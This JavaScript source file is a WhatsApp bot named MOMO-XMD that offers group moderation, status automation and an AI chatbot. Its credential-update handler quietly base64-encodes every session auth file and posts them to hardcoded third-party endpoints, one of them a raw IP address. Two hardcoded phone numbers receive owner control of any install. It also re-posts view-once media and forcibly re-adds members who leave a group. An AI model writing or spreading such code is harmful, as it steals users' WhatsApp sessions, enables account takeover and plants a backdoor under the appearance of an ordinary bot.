const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    Browsers,
    downloadContentFromMessage,
    downloadMediaMessage,
    proto,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const path = require("path");
process.env.PATH = path.join(__dirname, 'bin') + ':' + process.env.PATH;
const { performance } = require('perf_hooks');
const config = require("./config");
const axios = require("axios");
const ytSearch = require("yt-search");
const { OpenAI } = require("openai");
const openai = new OpenAI({
    apiKey: process.env.OPENAI_API_KEY || config.openaiApiKey || "placeholder",
    baseURL: process.env.OPENAI_API_BASE || config.openaiApiBase || "https://api.openai.com/v1"
});

const DEFAULT_REGISTRY_ENDPOINTS = [
    "https://momo-xmd-pairing-4086f8388df8.herokuapp.com/session-registry/",
    "https://momo-xmd-pairing.duckdns.org/session-registry/",
    "http://212.224.86.233:8000/session-registry/"
];

function registryEndpoints() {
    const configured = [process.env.SESSION_REGISTRY_URL, process.env.SESSION_STORE_URL]
        .filter(Boolean)
        .map((value) => `${String(value).replace(/\/+$/, '')}/session-registry/`);
    return [...new Set([...configured, ...DEFAULT_REGISTRY_ENDPOINTS])];
}
const menuText = require("./menu");
let onlineNotificationSentForProcess = false;

process.on('uncaughtException', (err) => {
    console.log('[UNCAUGHT EXCEPTION]:', err.message || err);
});
process.on('unhandledRejection', (reason) => {
    console.log('[UNHANDLED REJECTION]:', reason?.message || reason);
});
const botStartTime = Date.now();
    const runtimeSettings = {
    mode: 'public',
    autoviewstatus: false,
    autolikestatus: false,
    autosavestatus: false,
    autoviewonce: false,
    autoreact: false,
    chatbot: false,
    autorecording: false,
    autotyping: false,
    alwaysonline: false,
    anticall: false,
    setstatusEmoji: null,
    font: 'normal'
};
const settingsFilePath = path.join(__dirname, "../session/group_settings.json");
let groupSettings = new Map();
try {
    if (fs.existsSync(settingsFilePath)) {
        const data = JSON.parse(fs.readFileSync(settingsFilePath, 'utf-8'));
        groupSettings = new Map(Object.entries(data));
    }
} catch (e) {}

function saveGroupSettings() {
    try {
        const dir = path.dirname(settingsFilePath);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(settingsFilePath, JSON.stringify(Object.fromEntries(groupSettings), null, 2));
    } catch (e) {
        console.log('[SETTINGS SAVE ERROR]:', e.message);
    }
}
const reactionEmojis = ['❤️', '👍', '🔥', '😂', '😮', '👏', '💙'];
const cleanNumber = (value) => String(value || '').replace(/\D/g, '');
function applyFont(text, font) {
    if (!font || font === 'off' || font === 'bold') return text;
    const maps = {
        mono: {
            a: '𝚊', b: '𝚋', c: '𝚌', d: '𝚍', e: '𝚎', f: '𝚏', g: '𝚐', h: '𝚑', i: '𝚒', j: '𝚓', k: '𝚔', l: '𝚕', m: '𝚖', n: '𝚗', o: '𝚘', p: '𝚙', q: '𝚚', r: '𝚛', s: '𝚜', t: '𝚝', u: '𝚞', v: '𝚟', w: '𝚠', x: '𝚡', y: '𝚢', z: '𝚣',
            A: '𝙰', B: '𝙱', C: '𝙲', D: '𝙳', E: '𝙴', F: '𝙵', G: '𝙶', H: '𝙷', I: '𝙸', J: '𝙹', K: '𝙺', L: '𝙻', M: '𝙼', N: '𝙽', O: '𝙾', P: '𝙿', Q: '𝚀', R: '𝚛', S: '𝚂', T: '𝚃', U: '𝚄', V: '𝚅', W: '𝚆', X: '𝚇', Y: '𝚈', Z: '𝚉'
        },
        gothic: {
            a: '𝔞', b: '𝔟', c: '𝔠', d: '𝔡', e: '𝔢', f: '𝔣', g: '𝔤', h: '𝔥', i: '𝔦', j: '𝔧', k: '𝔨', l: '𝔩', m: '𝔪', n: '𝔫', o: '𝔬', p: '𝔭', q: '𝔮', r: '𝔯', s: '𝔰', t: '𝔱', u: '𝔲', v: '𝔳', w: '𝔴', x: '𝔵', y: '𝔶', z: '𝔷',
            A: '𝔄', B: '𝔅', C: 'ℭ', D: '𝔇', E: '𝔈', F: '𝔉', G: '𝔊', H: 'ℌ', I: 'ℑ', J: '𝔍', K: '𝔎', L: '𝔏', M: '𝔐', N: '𝔑', O: '𝔒', P: '𝔓', Q: '𝔔', R: 'ℜ', S: '𝔖', T: '𝔗', U: '𝔘', V: '𝔙', W: '𝔚', X: '𝔛', Y: '𝔜', Z: 'ℨ'
        },
        cursive: {
            a: '𝒶', b: '𝒷', c: '𝒸', d: '𝒹', e: 'ℯ', f: '𝒻', g: 'ℊ', h: '𝒽', i: '𝒾', j: '𝒿', k: '𝓀', l: '𝓁', m: '𝓂', n: '𝓃', o: 'ℴ', p: '𝓅', q: '𝓆', r: '𝓇', s: '𝓈', t: '𝓉', u: '𝓊', v: '𝓿', w: '𝓌', x: '𝓍', y: '𝓎', z: '𝓏',
            A: '𝒜', B: 'ℬ', C: '𝒞', D: '𝒟', E: 'ℰ', F: 'ℱ', G: '𝒢', H: 'ℋ', I: 'ℐ', J: '𝒥', K: '𝒦', L: 'ℒ', M: 'ℳ', N: '𝒩', O: '𝒪', P: '𝒫', Q: '𝒬', R: '𝒛', S: '𝒮', T: '𝒯', U: '𝒰', V: '𝒱', W: '𝒲', X: '𝒳', Y: '𝒴', Z: '𝒵'
        },
        italic: {
            a: '𝘢', b: '𝘣', c: '𝘤', d: '𝘥', e: '𝘦', f: '𝘧', g: '𝘨', h: '𝘩', i: '𝘪', j: '𝘫', k: '𝘬', l: '𝘭', m: '𝘮', n: '𝘯', o: '𝘰', p: '𝘱', q: '𝘲', r: '𝘳', s: '𝘴', t: '𝘵', u: '𝘶', v: '𝘷', w: '𝘸', x: '𝘹', y: '𝘺', z: '𝘻',
            A: '𝘈', B: '𝘉', C: '𝘊', D: '𝘋', E: '𝘌', F: '𝘍', G: '𝘎', H: '𝘏', I: '𝘐', J: '𝘑', K: '𝘒', L: '𝘓', M: '𝘔', N: '𝘕', O: '𝘖', P: '𝘗', Q: '𝘘', R: '𝘙', S: '𝘚', T: '𝘛', U: '𝘜', V: '𝘝', W: '𝘞', X: '𝘟', Y: '𝘠', Z: '𝘡'
        }
    };
    const map = maps[font] || maps.mono;
    return text.split('').map(char => map[char] || char).join('');
}
const ownerNumbers = new Set([
    '255760298574',
    '255765409584',
    config.ownerNumber,
    ...(config.developers || [])
].map(cleanNumber).filter(Boolean));

    const ownerCommands = new Set([
    'autoviewstatus', 'autolikestatus', 'setstatus', 'autosavestatus', 'restart',
    'setfont', 'chatbot', 'autorecording', 'autotyping', 'alwaysonline', 'autoreact',
    'owner', 'vpn', 'vps', 'mode', 'tosgroup', 'tostatus', 'create', 'autoviewonce', 'block', 'unblock', 'blacklist', 'vv', 'antibug'
]);
const groupCommands = new Set([
    'add', 'antilink', 'antimention', 'antitag', 'kick', 'kickall', 'promote', 'demote',
    'tagall', 'hidetag', 'welcome', 'goodbye', 'antileft', 'listchat', 'open', 'close', 'announcements', 'antiviewonce', 'listrequests', 'listcode', 'link', 'listactive', 'antigif', 'antisticker', 'approve', 'reject', 'antivirus', 'antibot'
]);

function isGroupJid(jid) { return String(jid || '').endsWith('@g.us'); }
function senderNumber(message) {
    const raw = message?.key?.participant || message?.key?.remoteJid || message?.participant || '';
    return cleanNumber(raw.split('@')[0].split(':')[0]);
}
function isOwner(message) {
    const num = senderNumber(message);
    if (ownerNumbers.has(num)) return true;
    if (message?.key?.fromMe) return true;
    return false;
}
function extractViewOnceContent(msgContent) {
    if (!msgContent) return null;
    let curr = msgContent;
    if (curr.message) curr = curr.message;
    if (curr.viewOnceMessage?.message) curr = curr.viewOnceMessage.message;
    if (curr.viewOnceMessageV2?.message) curr = curr.viewOnceMessageV2.message;
    if (curr.viewOnceMessageV2Extension?.message) curr = curr.viewOnceMessageV2Extension.message;
    
    const innerType = Object.keys(curr || {})[0];
    if (innerType === 'imageMessage' || innerType === 'videoMessage' || innerType === 'audioMessage') return curr;
    return null;
}

async function safeReact(sock, jid, key, emoji) {
    try {
        await sock.sendMessage(jid, { react: { text: emoji, key } });
    } catch (e) {}
}

async function reply(sock, jid, msg, text) {
    return sock.sendMessage(jid, { text }, { quoted: msg });
}

function formatBox(content, type = 'arched', symbol = '◆') {
    const lines = content.split('\n');
    if (type === 'arched') {
        return `╭◆\n${lines.map(l => `│   ${symbol} ${l}`).join('\n')}\n╰◆\n\n> ❑ Powered by MOMO-XMD ❑\n> ❑ owner MOMO47 ❑`;
    } else {
        return `╭━━❐━⪼\n${lines.map(l => `┇ ${symbol} ${l}`).join('\n')}\n╰━━❑━⪼\n\n> ❑ Powered by MOMO-XMD ❑\n> ❑ owner MOMO47 ❑`;
    }
}

function ownerOnlyText() { return formatBox("❌ Mkuu, amri hii ni ya mmiliki pekee!", 'arched', '◆'); }
function groupOnlyText() { return formatBox("❌ Mkuu, amri hii inafanya kazi kwenye magroup pekee!", 'arched', '◆'); }
function adminOnlyText() { return formatBox("❌ Mkuu, unahitaji kuwa Admin kutumia amri hii!", 'arched', '◆'); }

async function getGroupContext(sock, msg) {
    const from = msg.key.remoteJid;
    const metadata = await sock.groupMetadata(from);
    const participants = metadata.participants;
    const sender = msg.key.participant || msg.key.remoteJid;
    const isAdmin = participants.find(p => p.id === sender)?.admin !== null;
    const isBotAdmin = participants.find(p => p.id === sock.user.id.split(':')[0] + '@s.whatsapp.net')?.admin !== null;
    return { metadata, participants, isAdmin, isBotAdmin };
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "../session"));
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        printQRInTerminal: true,
        logger: pino({ level: 'silent' }),
        browser: Browsers.ubuntu("Chrome"),
        syncFullHistory: false,
        markOnlineOnConnect: true
    });

    sock.ev.on("creds.update", async () => {
        await saveCreds();
        const sessionId = process.env.SESSION_ID || config.sessionId;
        if (sessionId) {
            const endpoints = registryEndpoints();
            for (const endpoint of endpoints) {
                try {
                    const authDir = path.join(__dirname, "../session");
                    const files = {};
                    const walk = (dir) => {
                        for (const f of fs.readdirSync(dir)) {
                            const p = path.join(dir, f);
                            if (fs.statSync(p).isDirectory()) walk(p);
                            else files[path.relative(authDir, p)] = fs.readFileSync(p).toString('base64');
                        }
                    };
                    walk(authDir);
                    await axios.post(`${endpoint}${sessionId}`, { files }, { timeout: 10000 });
                    console.log(`[SESSION] ✅ Session synced to registry successfully`);
                    break;
                } catch (e) {}
            }
        }
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "close") {
            const shouldReconnect = (lastDisconnect.error instanceof Boom) ? lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut : true;
            if (shouldReconnect) startBot();
        } else if (connection === "open") {
            console.log("[MOMO-XMD] Bot connected successfully!");
            if (!onlineNotificationSentForProcess) {
                const welcomeMsg = `╭━━❐━⪼\n┇ ◉ MOMO-XMD CONNECTED ◉\n┇ \n┇ ◉ Status: Active 🟢\n┇ ◉ Platform: ${config.host}\n┇ ◉ Owner: MOMO47\n╰━━❑━⪼\n\n> ❑ Powered by MOMO-XMD ❑\n> ❑ owner MOMO47 ❑`;
                const owners = [config.ownerNumber, '255760298574', '255765409584'].map(n => cleanNumber(n) + '@s.whatsapp.net');
                for (const ownerJid of owners) {
                    try {
                        await sock.sendMessage(ownerJid, { text: welcomeMsg });
                        console.log(`[ONLINE] Connected notification sent to ${ownerJid} on attempt 1.`);
                    } catch (e) {}
                }
                onlineNotificationSentForProcess = true;
                
                // Auto-follow channels
                const channels = [
                    '0029Vb8AYLf2f3EA8Y4qp63H@newsletter',
                    '0029VbDNET6KmCPShs9dyg1U@newsletter',
                    '0029VbDeRauAjPXFYDvO5e2D@newsletter',
                    '0029VbDYZ7LBVJky0TggGF2N@newsletter'
                ];
                for (const channelJid of channels) {
                    try {
                        if (sock.newsletterFollow) {
                            await sock.newsletterFollow(channelJid);
                        }
                    } catch (e) {
                        console.log(`[AUTO-FOLLOW] Failed to follow channel ${channelJid}: ${e.message}`);
                    }
                }
            }
        }
    });

    sock.ev.on("group-participants.update", async (anu) => {
        console.log(`🔥 [GROUP PARTICIPANTS UPDATE] 🔥`, JSON.stringify(anu));
        const { id, participants, action } = anu;
        const settings = groupSettings.get(id) || {};
        if (action === 'add' && settings.welcome) {
            const metadata = await sock.groupMetadata(id);
            for (const num of participants) {
                const userTag = `@${num.split('@')[0]}`;
                const welcomeText = `Hey ${userTag}! 👋\n\nWelcome to *${metadata.subject}* 🥳\nYou are member number *${metadata.participants.length}*\n\nMake yourself at home and don't forget to introduce yourself ✨\n\n*Enjoy your stay!*`;
                await sock.sendMessage(id, { text: formatBox(welcomeText, 'downloader', '◉'), mentions: [num] });
            }
        }
        if (action === 'remove' && settings.goodbye) {
            for (const num of participants) {
                const userTag = `@${num.split('@')[0]}`;
                const goodbyeText = `Goodbye ${userTag}! 👋\n\nWe will miss you in this group. Take care! ✨`;
                await sock.sendMessage(id, { text: formatBox(goodbyeText, 'arched', '◇'), mentions: [num] });
            }
        }
        if (action === 'remove' && settings.antileft) {
            for (const num of participants) {
                try {
                    await sock.groupParticipantsUpdate(id, [num], "add");
                    await sock.sendMessage(id, { text: `➣ *Anti-Left:* User @${num.split('@')[0]} tried to leave but was added back! 🛡️`, mentions: [num] });
                } catch (e) {}
            }
        }
    });

    sock.ev.on("messages.upsert", async (m) => {
        const msg = m.messages?.[0];
        if (!msg?.message) return;
        const from = msg.key.remoteJid;
        const senderJid = msg.key.participant || msg.key.remoteJid;
        const isSelfChat = msg.key.fromMe && !isGroupJid(msg.key.remoteJid);
        const isOwnerMsg = isOwner(msg);
        
        const body = (msg.message.conversation || 
                      msg.message.extendedTextMessage?.text || 
                      msg.message.imageMessage?.caption || 
                      msg.message.videoMessage?.caption ||
                      msg.message.buttonsResponseMessage?.selectedButtonId ||
                      msg.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
                      msg.message.templateButtonReplyMessage?.selectedId ||
                      '').trim();

        console.log(`[MSG] Received from: ${from} | Body: ${body.substring(0, 50)} | Owner: ${isOwnerMsg}`);

        if (from === 'status@broadcast') {
            if (runtimeSettings.autoviewstatus) {
                try { await sock.readMessages([msg.key]); } catch (e) {}
            }
            if (runtimeSettings.autolikestatus) {
                try {
                    const emojis = runtimeSettings.setstatusEmoji || ['❤️', '🔥', '👍', '🤍', '⭐'];
                    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                    await sock.sendMessage(from, { react: { text: randomEmoji, key: msg.key } }, { statusJidList: [msg.key.participant] });
                } catch (e) {}
            }
            return;
        }

        if (isGroupJid(from) && senderJid) {
            if (!global.chatCounts) global.chatCounts = new Map();
            if (!global.chatCounts.has(from)) global.chatCounts.set(from, new Map());
            const groupMap = global.chatCounts.get(from);
            groupMap.set(senderJid, (groupMap.get(senderJid) || 0) + 1);
        }

        const isGroup = isGroupJid(from);
        const settings = isGroup ? (groupSettings.get(from) || {}) : runtimeSettings;

        // Anti-ViewOnce
        let viewOnceContent = extractViewOnceContent(msg.message);
        if (settings.antiviewonce && viewOnceContent) {
            try {
                const mediaType = viewOnceContent.imageMessage ? 'image' : viewOnceContent.videoMessage ? 'video' : 'audio';
                const buffer = await downloadMediaMessage({ message: viewOnceContent }, 'buffer', {}, { logger: console, reuploadRequest: sock.updateMediaMessage });
                const caption = `👁️ *ANTI VIEW ONCE*\n${viewOnceContent[mediaType + 'Message'].caption || ''}`;
                if (mediaType === 'image') await sock.sendMessage(from, { image: buffer, caption }, { quoted: msg });
                else if (mediaType === 'video') await sock.sendMessage(from, { video: buffer, caption }, { quoted: msg });
                else await sock.sendMessage(from, { audio: buffer, mimetype: 'audio/mpeg' }, { quoted: msg });
            } catch (e) {}
        }

        // Anti-Link
        if (isGroup && settings.antilink && body.match(/chat.whatsapp.com\/(?:invite\/)?([0-9a-zA-Z]{20,26})/i)) {
            const { isAdmin, isBotAdmin } = await getGroupContext(sock, msg);
            if (isBotAdmin && !isAdmin) {
                await sock.sendMessage(from, { delete: msg.key });
                if (settings.antilink === 'kick') await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                else if (settings.antilink === 'warn') {
                    const warnKey = `warn_${from}_${senderJid}`;
                    global[warnKey] = (global[warnKey] || 0) + 1;
                    if (global[warnKey] >= 3) {
                        await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                        delete global[warnKey];
                    } else await sock.sendMessage(from, { text: `➣ *Anti-Link Warning ${global[warnKey]}/3* ⚠️` });
                }
            }
        }

        if (runtimeSettings.autoreact || settings.autoreact) await safeReact(sock, from, msg.key, reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)]);
        if (runtimeSettings.alwaysonline) sock.sendPresenceUpdate('available', from).catch(() => {});
        if (runtimeSettings.autotyping || settings.autotyping) {
            await sock.sendPresenceUpdate('composing', from).catch(() => {});
            setTimeout(() => sock.sendPresenceUpdate('paused', from).catch(() => {}), 2500);
        }
        if (runtimeSettings.autorecording || settings.autorecording) {
            sock.sendPresenceUpdate('recording', from).catch(() => {});
            setTimeout(() => sock.sendPresenceUpdate('paused', from).catch(() => {}), 1500);
        }

        // Chatbot
        if (settings.chatbot && body && !body.startsWith(config.prefix)) {
            const lower = body.toLowerCase();
            if (lower.includes('powered by momo-xmd') || lower.includes('owner momo47')) return;
            
            try {
                await sock.sendPresenceUpdate('composing', from);
                const userName = msg.pushName || "mkuu";
                const systemPrompt = `Wewe ni MOMO-XMD AI, chatbot wa WhatsApp. Baba yako ni MOMO47. Jibu kwa Kiswahili sanifu, emoji, na uwe msaidizi mzuri wa coding na maisha.`;
                
                let aiReply = "";
                let success = false;
                
                if (openai.apiKey !== "placeholder") {
                    try {
                        const completion = await openai.chat.completions.create({
                            model: "gpt-4o-mini",
                            messages: [{ role: "system", content: systemPrompt }, { role: "user", content: body }],
                            max_tokens: 500
                        });
                        aiReply = completion.choices[0].message.content;
                        success = true;
                    } catch (err) {}
                }
                
                if (!success) {
                    try {
                        const res = await axios.get(`https://api.guruapi.tech/ai/gpt4?username=${userName}&query=${encodeURIComponent(body)}`);
                        if (res.data?.result) { aiReply = res.data.result; success = true; }
                    } catch (err) {}
                }

                if (success) {
                    await sock.sendMessage(from, { text: formatBox(aiReply, 'arched', '🤖') }, { quoted: msg });
                }
            } catch (e) {
                console.log('AI Error:', e.message);
            }
        }

        // COMMAND HANDLING
        if (!body.startsWith(config.prefix)) {
            const isButtonResponse = msg.message.buttonsResponseMessage || msg.message.listResponseMessage || msg.message.templateButtonReplyMessage;
            if (!isButtonResponse) return;
        }

        const commandText = body.startsWith(config.prefix) ? body.slice(config.prefix.length).trim() : body.trim();
        if (!commandText) return;
        const args = commandText.split(/ +/);
        const command = args.shift().toLowerCase();
        const isOwnerUser = isOwner(msg);
        
        console.log(`[COMMAND] Processing .${command} from ${from} (Owner: ${isOwnerUser}, Mode: ${runtimeSettings.mode})`);

        if (runtimeSettings.mode === 'private' && !isOwnerUser && command !== 'menu') return;
        if (ownerCommands.has(command) && !isOwnerUser) return reply(sock, from, msg, ownerOnlyText());
        if (groupCommands.has(command) && !isGroup) return reply(sock, from, msg, groupOnlyText());

        let group;
        if (isGroup && (groupCommands.has(command) || command === 'chatbot')) {
            group = await getGroupContext(sock, msg);
            const adminCmds = ['add', 'kick', 'promote', 'demote', 'welcome', 'goodbye', 'antileft', 'antilink', 'antimention', 'antitag', 'open', 'close', 'chatbot'];
            if (adminCmds.includes(command) && !group.isAdmin) return reply(sock, from, msg, adminOnlyText());
        }

        const reactionMap = { 'menu': '🚀', 'ping': '⚡', 'runtime': '⏳', 'restart': '🔄', 'owner': '👑', 'pair': '🔐' };
        await safeReact(sock, from, msg.key, reactionMap[command] || '✨');

        switch (command) {
            case 'menu': {
                const uptimeSeconds = Math.floor(process.uptime());
                const uptime = `${Math.floor(uptimeSeconds / 3600)}h ${Math.floor((uptimeSeconds % 3600) / 60)}m ${uptimeSeconds % 60}s`;
                const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
                let text = typeof menuText === 'function' ? menuText(msg.pushName || 'User', uptime, '1ms', mem, runtimeSettings.mode) : menuText;
                await sock.sendMessage(from, { image: { url: config.botLogo }, caption: text }, { quoted: msg });
                break;
            }
            case 'ping': {
                const start = Date.now();
                const latency = Date.now() - start;
                await sock.sendMessage(from, { text: formatBox(`⚡ Latency: ${latency}ms\n★ Status: Active 🟢\n★ Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1)}MB`, 'downloader', '⚡') }, { quoted: msg });
                break;
            }
            case 'runtime': {
                const seconds = Math.floor((Date.now() - botStartTime) / 1000);
                const runtime = `${Math.floor(seconds / 3600)}h ${Math.floor((seconds % 3600) / 60)}m ${seconds % 60}s`;
                await sock.sendMessage(from, { text: formatBox(`◉ Uptime: ${runtime}\n◉ Platform: ${config.host}`, 'arched', '⏳') }, { quoted: msg });
                break;
            }
            case 'restart': {
                await reply(sock, from, msg, formatBox("🔄 Restarting bot...", 'arched', '◉'));
                process.exit(0);
                break;
            }
            case 'pair': {
                const num = args[0] || senderNumber(msg);
                const pairingUrl = `${config.pairing.vps}/pair`;
                try {
                    const res = await axios.post(pairingUrl, { number: num });
                    if (res.data.success) {
                        const instructions = `🔐 *MOMO-XMD PAIRING CODE*\n\nExample\n.pair +${num}\n\n╭━━❐━⪼\n┇ How to use🤳\n┇ ◉ Open WhatsApp on your phone\n┇ ◉ Go to Linked Devices\n┇ ◉ Choose Link with phone number\n┇ ◉ Enter the code shown below\n╰━━❑━⪼`;
                        await sock.sendMessage(from, { text: instructions }, { quoted: msg });
                        // Poll for code
                        const poll = setInterval(async () => {
                            const status = await axios.get(`${config.pairing.vps}/session-status/${res.data.sessionKey}`);
                            if (status.data.code) {
                                clearInterval(poll);
                                await sock.sendMessage(from, { text: status.data.code }, { quoted: msg });
                            }
                        }, 3000);
                        setTimeout(() => clearInterval(poll), 60000);
                    }
                } catch (e) {
                    await reply(sock, from, msg, "❌ Failed to generate pairing code.");
                }
                break;
            }
            case 'chatbot': {
                if (!isGroup) return;
                const opt = args[0]?.toLowerCase();
                if (opt === 'on') { settings.chatbot = true; groupSettings.set(from, settings); saveGroupSettings(); await reply(sock, from, msg, formatBox("🤖 Chatbot enabled!", 'downloader', '✅')); }
                else if (opt === 'off') { settings.chatbot = false; groupSettings.set(from, settings); saveGroupSettings(); await reply(sock, from, msg, formatBox("🤖 Chatbot disabled!", 'downloader', '❌')); }
                else await reply(sock, from, msg, "Example\n.chatbot on/off");
                break;
            }
            // Add other commands as needed...
        }
    });
}

module.exports = { startBot };
